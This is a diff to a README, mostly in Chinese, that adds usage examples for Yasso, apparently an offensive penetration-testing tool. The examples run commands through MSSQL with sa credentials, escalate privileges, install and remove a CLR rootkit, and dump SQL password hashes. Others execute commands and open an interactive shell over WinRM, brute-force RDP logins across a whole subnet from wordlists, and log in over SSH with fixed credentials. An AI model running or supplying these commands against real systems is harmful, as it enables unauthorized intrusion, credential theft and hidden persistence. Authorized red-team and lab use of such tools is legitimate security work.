@@ -381,6 +381,38 @@ Flags:
 ```
 
 ## 使用例子👿
+mssql 的命令执行提权和WarSQLKit-clr提权Rookit安装卸载执行功能
+```
+Yasso.exe crack mssql --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128 
+Yasso.exe crack mssql --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128 --method 2
+Yasso.exe crack mssql --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128 --inkit 1
+Yasso.exe crack mssql --hostname 192.168.248.128 --user sa --pass "admin@123" --cld "sp_getSqlHash"
+Yasso.exe crack mssql --hostname 192.168.248.128 --user sa --pass "admin@123" --cld "whoami"
+Yasso.exe crack mssql --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128 --unkit 1
+```
+![image](https://user-images.githubusercontent.com/74412075/148234003-8e2ceb59-95c5-4fc3-ad65-501294ddce6b.png)
+
+winrm 的命令执行和交互shell
+```
+Yasso.exe crack winrm --hostname 192.168.248.128 -c "ipconfig /all" --pass "930517" --user "administrator"
+```
+![image](https://user-images.githubusercontent.com/74412075/148234337-80fabcef-a333-402d-8e97-e694b89119c0.png)
+```
+Yasso.exe crack winrm --hostname 192.168.248.128 --shell --pass "930517" --user "administrator"
+```
+![image](https://user-images.githubusercontent.com/74412075/148234486-037aaf56-fe11-40a0-9781-82b537ef9a37.png)
+
+grdp的强大爆破功能
+```
+Yasso.exe crack grdp --domain "kilon.local" --pd .\pass.txt --ud .\user.txt -H 192.168.248.128/24 --crack
+```
+![image](https://user-images.githubusercontent.com/74412075/148234733-fbdc34e7-c73e-49f7-8942-3a1863915213.png)
+
+ssh的交互式登陆
+```
+Yasso.exe crack ssh --hostname 192.168.248.219 --user root --pass kali
+```
+![image](https://user-images.githubusercontent.com/74412075/148235003-a72116d3-df9b-4b4e-9523-21d5f8b30e1b.png)
 
 
 ## 工具优势🤡
